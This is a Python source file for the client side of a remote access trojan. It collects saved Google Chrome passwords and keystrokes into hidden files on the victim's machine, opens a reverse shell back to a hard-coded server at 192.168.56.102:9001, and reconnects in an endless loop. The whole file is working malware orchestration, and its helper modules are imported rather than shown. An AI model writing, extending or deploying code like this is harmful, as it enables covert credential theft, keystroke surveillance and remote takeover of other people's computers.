from connection import Connection
from rev_shell import Shell
import socket
from chrome_passwords import ChromePass
from keylogger import KeyLogger


class Client:
    """
    Performs all necessary actions for the RAT to function:
        - Creates socket
        - Gets passwords from google chrome
        - Logs key events to a file
        - Gets a reverse shell back to the server
    """

    def __init__(self, host: str, port: int, keylog_filename: str = ".activity.txt", chromepass_filename: str = ".chrome_log.txt") -> None:
        """
        Constructor

        required:
        :param host: The server's IP
        :param port: The server's port number
        
        optional:
        :param keylog_filename: The file's name where the keystrokes are stored
        :param chromepass_filename: The file name where the chrome passwords are stored
        """

        self.host = host
        self.port = port
        self.keylog_filename = keylog_filename
        self.chromepass_filename = chromepass_filename

        # Create client instance
        self.client = Connection(self.host, self.port)

        # Open socket connection back to server
        self.sock = self.client.connect()

        # Create shell instance
        self.shell = Shell(self.sock)

        # Create google password collector instance
        self.chrome_pass = ChromePass(self.chromepass_filename)

        # Initialize keylogger instance
        self.keylogger = KeyLogger(self.keylog_filename)


    def run(self) -> None:
        """
        1. Stores google chrome passwords to file
        2. Starts logging key events to file
        3. Gets a reverse shell from client to server
        """

        #-------------------------CHROME PASSWORDS---------------------#

        self.chrome_pass.get_chrome_pass()

        # --------------------------KEYLOGGER--------------------------#

        self.keylogger.start_log()

        # --------------------------REV SHELL--------------------------#

        self.shell.get_shell()

        # --------------------------------------------------------------#

        #Close connection when done
        self.sock.close()


if __name__ == "__main__":
    # Run RAT with specified IP and port continiously
    while 1:
        Client("192.168.56.102", 9001).run()